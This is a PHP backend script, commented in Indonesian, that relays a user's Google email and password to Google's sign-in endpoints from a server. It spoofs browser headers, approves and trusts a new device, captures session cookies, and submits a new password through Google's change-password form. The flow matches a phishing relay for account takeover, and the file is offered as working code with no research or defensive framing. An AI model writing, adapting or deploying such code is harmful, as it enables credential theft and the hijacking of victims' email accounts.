<?php
header('Content-Type: application/json');
header('Access-Control-Allow-Origin: *');
header('Access-Control-Allow-Methods: GET, POST, OPTIONS');
header('Access-Control-Allow-Headers: Content-Type, Authorization, X-Requested-With');

// Konfigurasi keamanan
session_start();
define('MAX_REQUESTS_PER_MINUTE', 30);
define('REQUEST_TIMEOUT', 30);

// Rate limiting
$client_ip = $_SERVER['REMOTE_ADDR'];
$current_time = time();
$requests_key = "requests_{$client_ip}";

if (!isset($_SESSION[$requests_key])) {
    $_SESSION[$requests_key] = [];
}

// Hapus request yang lebih dari 1 menit
$_SESSION[$requests_key] = array_filter($_SESSION[$requests_key], function($time) use ($current_time) {
    return ($current_time - $time) < 60;
});

// Cek rate limit
if (count($_SESSION[$requests_key]) >= MAX_REQUESTS_PER_MINUTE) {
    http_response_code(429);
    echo json_encode(['success' => false, 'error' => 'Rate limit exceeded. Please try again later.']);
    exit;
}

// Tambahkan request saat ini
$_SESSION[$requests_key][] = $current_time;

// Fungsi untuk membuat request ke Google
function makeGoogleRequest($url, $method = 'GET', $data = null, $headers = []) {
    $ch = curl_init();
    
    // Set URL
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
    curl_setopt($ch, CURLOPT_MAXREDIRS, 10);
    curl_setopt($ch, CURLOPT_TIMEOUT, REQUEST_TIMEOUT);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, true);
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 2);
    
    // Set method
    curl_setopt($ch, CURLOPT_CUSTOMREQUEST, $method);
    
    // Set headers
    $defaultHeaders = [
        'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
        'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
        'Accept-Language: id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7',
        'Accept-Encoding: gzip, deflate, br',
        'Connection: keep-alive',
        'Upgrade-Insecure-Requests: 1',
        'Sec-Fetch-Dest: document',
        'Sec-Fetch-Mode: navigate',
        'Sec-Fetch-Site: none',
        'Sec-Fetch-User: ?1',
        'Cache-Control: no-cache',
        'Pragma: no-cache'
    ];
    
    $allHeaders = array_merge($defaultHeaders, $headers);
    curl_setopt($ch, CURLOPT_HTTPHEADER, $allHeaders);
    
    // Set data untuk POST
    if ($method === 'POST' && $data) {
        curl_setopt($ch, CURLOPT_POST, true);
        curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
    }
    
    // Cookie jar untuk menyimpan cookies
    $cookieFile = tempnam(sys_get_temp_dir(), 'google_cookies_');
    curl_setopt($ch, CURLOPT_COOKIEJAR, $cookieFile);
    curl_setopt($ch, CURLOPT_COOKIEFILE, $cookieFile);
    
    // Eksekusi request
    $response = curl_exec($ch);
    $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    $error = curl_error($ch);
    
    // Baca cookies dari file
    $cookies = [];
    if (file_exists($cookieFile)) {
        $cookieContent = file_get_contents($cookieFile);
        $lines = explode("\n", $cookieContent);
        foreach ($lines as $line) {
            if (strpos($line, "\t") !== false) {
                $parts = explode("\t", $line);
                if (count($parts) >= 7) {
                    $cookies[$parts[5]] = $parts[6];
                }
            }
        }
        unlink($cookieFile);
    }
    
    curl_close($ch);
    
    if ($error) {
        return [
            'success' => false,
            'error' => $error,
            'http_code' => $httpCode
        ];
    }
    
    return [
        'success' => true,
        'data' => $response,
        'http_code' => $httpCode,
        'cookies' => $cookies
    ];
}

// Fungsi untuk extract parameter dari HTML Google
function extractGoogleParams($html) {
    $params = [];
    
    if (empty($html)) {
        return $params;
    }
    
    // Extract TL parameter
    if (preg_match('/TL=([A-Za-z0-9_-]+)/', $html, $matches)) {
        $params['TL'] = $matches[1];
    }
    
    // Extract dari input hidden
    if (preg_match_all('/<input[^>]*name="([^"]+)"[^>]*value="([^"]*)"[^>]*>/', $html, $matches, PREG_SET_ORDER)) {
        foreach ($matches as $match) {
            $name = $match[1];
            $value = $match[2];
            if ($name && $value && stripos($name, 'password') === false) {
                $params[$name] = $value;
            }
        }
    }
    
    // Extract dari URL parameters
    if (preg_match_all('/[?&]([^=&#]+)=([^&#]*)/', $html, $matches, PREG_SET_ORDER)) {
        foreach ($matches as $match) {
            $params[$match[1]] = urldecode($match[2]);
        }
    }
    
    // Parameter Google spesifik
    $googleParams = ['gxf', 'cid', 'ifkv', 'dsh', 'checkConnection', 'checkedDomains', 'pstMsg', 'continue', 'followup', 'service', 'scc', 'osid'];
    foreach ($googleParams as $param) {
        if (preg_match('/' . $param . '=([^&"\s]+)/i', $html, $matches)) {
            $params[$param] = $matches[1];
        }
    }
    
    return $params;
}

// Handle request
$action = $_GET['action'] ?? $_POST['action'] ?? '';

try {
    switch ($action) {
        case 'get_initial_page':
            $url = 'https://accounts.google.com/v3/signin/recoveryidentifier';
            $params = [
                'flowEntry' => 'ServiceLogin',
                'flowName' => 'GlifWebSignIn',
                'hl' => 'id',
                'dsh' => 'S' . time() . rand(1000, 9999),
                '_' => time()
            ];
            
            $url .= '?' . http_build_query($params);
            $result = makeGoogleRequest($url);
            
            if ($result['success']) {
                $params = extractGoogleParams($result['data']);
                echo json_encode([
                    'success' => true,
                    'html' => $result['data'],
                    'params' => $params,
                    'cookies' => $result['cookies']
                ]);
            } else {
                echo json_encode($result);
            }
            break;
            
        case 'submit_email':
            $email = $_POST['email'] ?? '';
            $initialHtml = $_POST['initial_html'] ?? '';
            
            if (!$email) {
                throw new Exception('Email is required');
            }
            
            $url = 'https://accounts.google.com/v3/signin/recoveryidentifier';
            $result = makeGoogleRequest($url, 'POST', http_build_query([
                'identifier' => $email,
                'profileInformation' => '',
                'gxf' => 'AFoagUUAAAA:1700000000000',
                'continue' => 'https://myaccount.google.com/',
                'followup' => 'https://myaccount.google.com/',
                'service' => 'mail',
                'scc' => '1',
                'osid' => '1',
                'flowName' => 'GlifWebSignIn',
                'flowEntry' => 'ServiceLogin',
                'hl' => 'id'
            ]));
            
            if ($result['success']) {
                $params = extractGoogleParams($result['data']);
                echo json_encode([
                    'success' => true,
                    'html' => $result['data'],
                    'params' => $params,
                    'cookies' => $result['cookies']
                ]);
            } else {
                echo json_encode($result);
            }
            break;
            
        case 'submit_password':
            $email = $_POST['email'] ?? '';
            $password = $_POST['password'] ?? '';
            $currentParams = json_decode($_POST['params'] ?? '[]', true);
            
            if (!$email || !$password) {
                throw new Exception('Email and password are required');
            }
            
            $url = 'https://accounts.google.com/v3/signin/challenge/pwd';
            $queryParams = array_merge([
                'TL' => $currentParams['TL'] ?? 'AHE' . time() . rand(1000, 9999),
                'checkConnection' => 'youtube:596',
                'checkedDomains' => 'youtube',
                'cid' => '2',
                'dsh' => 'S' . time() . rand(1000, 9999),
                'flowEntry' => 'ServiceLogin',
                'flowName' => 'GlifWebSignIn',
                'hl' => 'id',
                'pstMsg' => '1',
                '_' => time()
            ], $currentParams);
            
            $url .= '?' . http_build_query($queryParams);
            
            $result = makeGoogleRequest($url, 'POST', http_build_query([
                'identifier' => $email,
                'password' => $password,
                'profileInformation' => '',
                'gxf' => 'AFoagUUAAAA:1700000000000',
                'continue' => 'https://myaccount.google.com/',
                'followup' => 'https://myaccount.google.com/',
                'service' => 'mail',
                'scc' => '1',
                'osid' => '1',
                'flowName' => 'GlifWebSignIn',
                'flowEntry' => 'ServiceLogin'
            ]));
            
            if ($result['success']) {
                $params = extractGoogleParams($result['data']);
                echo json_encode([
                    'success' => true,
                    'html' => $result['data'],
                    'params' => $params,
                    'cookies' => $result['cookies'],
                    'requires_device_approval' => strpos($result['data'], 'challenge/dp') !== false
                ]);
            } else {
                echo json_encode($result);
            }
            break;
            
        case 'submit_device_approval':
            $email = $_POST['email'] ?? '';
            $deviceName = $_POST['device_name'] ?? '';
            $currentParams = json_decode($_POST['params'] ?? '[]', true);
            
            if (!$email || !$deviceName) {
                throw new Exception('Email and device name are required');
            }
            
            $url = 'https://accounts.google.com/v3/signin/challenge/dp';
            $queryParams = array_merge([
                'TL' => $currentParams['TL'] ?? 'AHE' . time() . rand(1000, 9999),
                'checkConnection' => 'youtube:200',
                'checkedDomains' => 'youtube',
                'cid' => '4',
                'dsh' => 'S' . time() . rand(1000, 9999),
                'flowEntry' => 'ServiceLogin',
                'flowName' => 'GlifWebSignIn',
                'hl' => 'id',
                'pstMsg' => '1',
                'ifkv' => $currentParams['ifkv'] ?? '',
                '_' => time()
            ], $currentParams);
            
            $url .= '?' . http_build_query($queryParams);
            
            $result = makeGoogleRequest($url, 'POST', http_build_query([
                'identifier' => $email,
                'deviceName' => $deviceName,
                'action' => 'ALLOW',
                'trustDevice' => 'true',
                'profileInformation' => '',
                'gxf' => 'AFoagUUAAAA:1700000000000',
                'continue' => 'https://myaccount.google.com/',
                'followup' => 'https://myaccount.google.com/',
                'service' => 'mail',
                'scc' => '1',
                'osid' => '1',
                'flowName' => 'GlifWebSignIn',
                'flowEntry' => 'ServiceLogin'
            ]));
            
            if ($result['success']) {
                $params = extractGoogleParams($result['data']);
                $deviceApproved = strpos($result['data'], 'Selamat datang kembali') !== false || 
                                 strpos($result['data'], 'Welcome back') !== false;
                
                echo json_encode([
                    'success' => true,
                    'html' => $result['data'],
                    'params' => $params,
                    'cookies' => $result['cookies'],
                    'device_approved' => $deviceApproved,
                    'device_notification_sent' => true
                ]);
            } else {
                echo json_encode($result);
            }
            break;
            
        case 'load_nudge_page':
            $currentParams = json_decode($_POST['params'] ?? '[]', true);
            
            $url = 'https://accounts.google.com/v3/signin/speedbump/changepassword/changepasswordnudge';
            $queryParams = array_merge([
                'TL' => $currentParams['TL'] ?? 'AHE' . time() . rand(1000, 9999),
                'checkConnection' => 'youtube:554',
                'checkedDomains' => 'youtube',
                'dsh' => 'S-' . time() . rand(1000, 9999),
                'flowEntry' => 'ServiceLogin',
                'flowName' => 'GlifWebSignIn',
                'hl' => 'id',
                'ifkv' => $currentParams['ifkv'] ?? '',
                'pstMsg' => '1',
                '_' => time()
            ], $currentParams);
            
            $url .= '?' . http_build_query($queryParams);
            $result = makeGoogleRequest($url);
            
            if ($result['success']) {
                $params = extractGoogleParams($result['data']);
                echo json_encode([
                    'success' => true,
                    'html' => $result['data'],
                    'params' => $params,
                    'cookies' => $result['cookies']
                ]);
            } else {
                echo json_encode($result);
            }
            break;
            
        case 'submit_password_change':
            $email = $_POST['email'] ?? '';
            $newPassword = $_POST['new_password'] ?? '';
            $currentParams = json_decode($_POST['params'] ?? '[]', true);
            
            if (!$email || !$newPassword) {
                throw new Exception('Email and new password are required');
            }
            
            $url = 'https://accounts.google.com/v3/signin/speedbump/changepassword/changepasswordform';
            $queryParams = array_merge([
                'TL' => $currentParams['TL'] ?? 'AHE' . time() . rand(1000, 9999),
                'checkConnection' => 'youtube:554',
                'checkedDomains' => 'youtube',
                'dsh' => 'S-' . time() . rand(1000, 9999),
                'flowEntry' => 'ServiceLogin',
                'flowName' => 'GlifWebSignIn',
                'hl' => 'id',
                'ifkv' => $currentParams['ifkv'] ?? '',
                'pstMsg' => '1',
                '_' => time()
            ], $currentParams);
            
            $url .= '?' . http_build_query($queryParams);
            
            $result = makeGoogleRequest($url, 'POST', http_build_query([
                'identifier' => $email,
                'newPassword' => $newPassword,
                'confirmPassword' => $newPassword,
                'profileInformation' => '',
                'gxf' => 'AFoagUUAAAA:1700000000000',
                'continue' => 'https://myaccount.google.com/',
                'followup' => 'https://myaccount.google.com/',
                'service' => 'mail',
                'scc' => '1',
                'osid' => '1',
                'flowName' => 'GlifWebSignIn',
                'flowEntry' => 'ServiceLogin'
            ]));
            
            if ($result['success']) {
                $passwordChanged = strpos($result['data'], 'password changed') !== false || 
                                  strpos($result['data'], 'sandi diganti') !== false;
                
                echo json_encode([
                    'success' => true,
                    'html' => $result['data'],
                    'password_changed' => $passwordChanged,
                    'cookies' => $result['cookies']
                ]);
            } else {
                echo json_encode($result);
            }
            break;
            
        case 'check_status':
            // Simpan status session
            $_SESSION['recovery_status'] = $_POST['status'] ?? [];
            echo json_encode(['success' => true, 'status' => $_SESSION['recovery_status']]);
            break;
            
        case 'get_status':
            echo json_encode(['success' => true, 'status' => $_SESSION['recovery_status'] ?? []]);
            break;
            
        default:
            echo json_encode([
                'success' => false,
                'error' => 'Invalid action',
                'available_actions' => [
                    'get_initial_page',
                    'submit_email',
                    'submit_password',
                    'submit_device_approval',
                    'load_nudge_page',
                    'submit_password_change',
                    'check_status',
                    'get_status'
                ]
            ]);
    }
} catch (Exception $e) {
    http_response_code(500);
    echo json_encode([
        'success' => false,
        'error' => $e->getMessage()
    ]);
}
?>